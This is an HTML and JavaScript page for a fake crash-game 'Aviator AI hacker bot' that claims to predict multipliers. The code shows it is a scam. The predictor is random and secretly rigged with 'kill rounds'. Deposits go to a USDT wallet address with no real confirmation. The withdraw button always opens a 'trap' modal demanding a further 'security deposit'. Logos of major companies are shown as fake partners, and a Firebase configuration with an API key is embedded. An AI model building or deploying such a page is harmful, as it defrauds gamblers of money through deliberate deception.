<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator AI Pro - V4</title>
    <style>
        :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; --green: #28a745; --binance: #f0b90b; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; text-align: center; }
        
        /* Nav & Tab Bar */
        .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; position: sticky; top: 0; z-index: 1000; }
        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; font-size: 1rem; }
        .tab-bar { display: flex; justify-content: center; background: #111; padding: 10px; gap: 8px; border-bottom: 1px solid #222; }
        .tab-btn { background: #222; color: #888; border: none; padding: 10px 14px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.75rem; }
        .tab-btn.active { background: var(--primary); color: white; box-shadow: 0 0 10px var(--primary); }

        /* General Page Styling */
        .page { display: none; padding: 20px; animation: slideUp 0.4s ease-out; }
        .page.active { display: block; }
        @keyframes slideUp { from { transform: translateY(15px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        /* Hacker Bot Page */
        .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 210px; margin: 0 auto 15px; padding: 12px; box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
        #next-pred { font-size: 2.8rem; color: var(--neon); font-weight: 900; }
        #game-box { position: relative; width: 100%; max-width: 600px; height: 280px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; }
        .controls { background: #1b1c1d; width: 100%; max-width: 600px; margin: 15px auto; padding: 20px; border-radius: 20px; border: 1px solid #333; box-sizing: border-box; }
        
        /* Input & Button */
        input { width: 100%; padding: 14px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; margin: 10px 0; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 18px; font-size: 1.4rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }

        /* Trust Footer */
        .footer { margin-top: 40px; padding: 30px 10px; border-top: 1px solid #222; background: #0e0f10; }
        .logo-row { display: flex; justify-content: center; gap: 20px; align-items: center; flex-wrap: wrap; margin-top: 15px; }
        .logo-row img { height: 24px; }

        /* Trap Modal */
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
        .modal-box { background: #1b1c1d; padding: 30px; border-radius: 25px; border: 1px solid #444; width: 100%; max-width: 350px; }
    </style>
</head>
<body>

    <div class="nav">
        <div style="font-weight:900; color:var(--primary); font-size: 1.2rem;">AVIATOR AI BOT</div>
        <div class="bal-box">৳ <span id="balance">0.00</span></div>
    </div>

    <div class="tab-bar">
        <button class="tab-btn active" onclick="showPage('game', this)">HACKER BOT</button>
        <button class="tab-btn" onclick="showPage('deposit', this)">DEPOSIT</button>
        <button class="tab-btn" onclick="showPage('withdraw', this)">WITHDRAW</button>
    </div>

    <div id="game" class="page active">
        <div class="predictor-card">
            <div style="font-size:0.5rem; color:#888; letter-spacing: 2px;">LIVE SERVER SIGNAL</div>
            <div id="next-pred">WAITING</div>
        </div>
        <div id="game-box">
            <div id="multiplier">1.00x</div>
            <canvas id="gameCanvas"></canvas>
        </div>
        <div class="controls">
            <input type="number" id="betAmt" value="50">
            <button id="actionBtn" class="btn-main" style="background: var(--green);">PLACE BET</button>
        </div>
    </div>

    <div id="deposit" class="page">
        <div style="max-width:400px; margin:auto; background:#1b1c1d; padding:25px; border-radius:20px; border:1px solid #333; text-align:left;">
            <h2 style="color:var(--binance);">Secure Deposit</h2>
            <div style="background:#000; padding:15px; border-radius:12px; border:1px solid var(--binance); margin-bottom:15px;">
                <label style="color:var(--binance); font-size:0.8rem;">USDT (BEP20) Wallet:</label>
                <div style="display:flex; align-items:center; gap:10px; margin-top:5px;">
                    <span id="addr" style="font-size:0.7rem; word-break:break-all;">0xf32ce22b5d6a15f6e48413485ce8239658596d84</span>
                    <button onclick="copyAddr()" style="background:var(--binance); border:none; padding:5px 10px; border-radius:5px; font-weight:bold; cursor:pointer;">COPY</button>
                </div>
            </div>
            <button onclick="alert('Transaction pending... Check back in 5 mins.')" class="btn-main" style="background:var(--primary);">I HAVE PAID</button>
        </div>
    </div>

    <div id="withdraw" class="page">
        <div style="max-width:400px; margin:auto; background:#1b1c1d; padding:25px; border-radius:20px; border:1px solid #333; text-align:left;">
            <h2>Withdraw</h2>
            <input type="text" placeholder="Wallet Address / Number">
            <input type="number" placeholder="Amount (Min ৳800)">
            <button onclick="showTrap()" class="btn-main" style="background:#333;">SUBMIT WITHDRAW</button>
        </div>
    </div>

    <div class="footer">
        <div style="font-size:0.6rem; color:#555; text-transform:uppercase; letter-spacing:2px;">Official Global Partners</div>
        <div class="logo-row">
            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.svg?v=032" alt="Binance">
            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter: invert(1);" alt="Apple">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=032" alt="USDT">
        </div>
    </div>

    <div id="trapModal" class="modal-overlay">
        <div class="modal-box">
            <h3 style="color:var(--primary); margin-top:0;">Account Restricted</h3>
            <p style="font-size:0.9rem; color:#ccc; line-height:1.6;">High-profit pattern detected. To verify your wallet and unlock withdrawals, a security deposit of **৳350** is required.</p>
            <button onclick="showPage('deposit')" class="btn-main" style="background:var(--green); font-size:1.1rem;">VERIFY NOW (৳350)</button>
        </div>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {
        apiKey: "AIzaSyBrMOmNOmopMwh35MFs8_u99LbroeLu_4s",
        authDomain: "avaitor-game-c3d80.firebaseapp.com",
        databaseURL: "https://avaitor-game-c3d80-default-rtdb.firebaseio.com",
        projectId: "avaitor-game-c3d80"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const userRef = ref(db, 'users/user_01');

    let balance = 0, isFlying = false, startTime, currentBet = 0;
    let predSignal = 0, actualCrash = 0;
    let roundCount = 0, cycleLength = 0, falseRounds = [];

    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 600; canvas.height = 280;

    onValue(userRef, (s) => {
        balance = s.val().balance;
        document.getElementById('balance').innerText = balance.toFixed(2);
    });

    // --- GAP-BASED CYCLE LOGIC ---
    function generateNewCycle() {
        cycleLength = Math.floor(Math.random() * 3) + 5; 
        roundCount = 0;
        let positions = [];
        let count = Math.random() < 0.5 ? 2 : 3; 
        while(positions.length < count) {
            let pos = Math.floor(Math.random() * cycleLength);
            if(!positions.includes(pos) && !positions.includes(pos-1) && !positions.includes(pos+1)) {
                positions.push(pos);
            }
        }
        falseRounds = positions;
    }

    // --- AUTO-REFRESH SIGNAL LOGIC ---
    function setupRound() {
        if (roundCount >= cycleLength) generateNewCycle();
        
        // Always change Predictor Point (Every single round)
        predSignal = (Math.random() * (15.00 - 1.80) + 1.80).toFixed(2);
        
        // Decide if this round is a False (Trap) Round
        if (falseRounds.includes(roundCount)) {
            actualCrash = (1.00 + Math.random() * 0.12).toFixed(2); // Kill round
        } else {
            actualCrash = predSignal; // Match round
        }

        // Update Predictor UI
        document.getElementById('next-pred').innerText = predSignal + "x";
        document.getElementById('multiplier').innerText = "1.00x";
        document.getElementById('multiplier').style.color = "white";
        
        roundCount++;
        ctx.clearRect(0,0,600,280);
    }

    generateNewCycle();
    setupRound();

    function drawLine(elapsed) {
        ctx.clearRect(0,0,600,280);
        ctx.beginPath(); ctx.strokeStyle = "#ff0040"; ctx.lineWidth = 6;
        ctx.shadowBlur = 10; ctx.shadowColor = "#ff0040";
        ctx.moveTo(0, 280);
        ctx.quadraticCurveTo(elapsed*60, 280, elapsed*120, 280-(elapsed*45));
        ctx.stroke();
    }

    function animate() {
        if (!isFlying) return;
        let elapsed = (Date.now() - startTime) / 1000;
        let val = (1 + Math.pow(elapsed, 1.4) * 0.15).toFixed(2);
        document.getElementById('multiplier').innerText = val + "x";
        drawLine(elapsed);
        
        if (parseFloat(val) >= actualCrash) {
            isFlying = false;
            document.getElementById('multiplier').style.color = "red";
            
            // --- AUTOMATICALLY CHANGE POINT AFTER CRASH ---
            setTimeout(() => {
                document.getElementById('actionBtn').innerText = "PLACE BET";
                document.getElementById('actionBtn').style.background = "var(--green)";
                setupRound(); // <--- Points change here every round!
            }, 2500);
        } else { requestAnimationFrame(animate); }
    }

    document.getElementById('actionBtn').onclick = function() {
        if(!isFlying) {
            let amt = parseFloat(document.getElementById('betAmt').value);
            if(balance < amt) return alert("Low Balance! Please Deposit.");
            currentBet = amt; balance -= amt; update(userRef, {balance});
            isFlying = true; startTime = Date.now();
            this.innerText = "CASH OUT"; this.style.background = "#ff9800";
            animate();
        } else {
            let winM = parseFloat(document.getElementById('multiplier').innerText);
            balance += (currentBet * winM); update(userRef, {balance});
            isFlying = false; alert("Victory! Profit saved.");
        }
    };

    window.showPage = (p, b) => {
        document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
        document.getElementById(p).classList.add('active');
        if(b) b.classList.add('active');
        document.getElementById('trapModal').style.display='none';
    };

    window.copyAddr = () => {
        navigator.clipboard.writeText(document.getElementById('addr').innerText);
        alert("Wallet Copied!");
    };

    window.showTrap = () => document.getElementById('trapModal').style.display = 'flex';

</script>
</body>
</html>
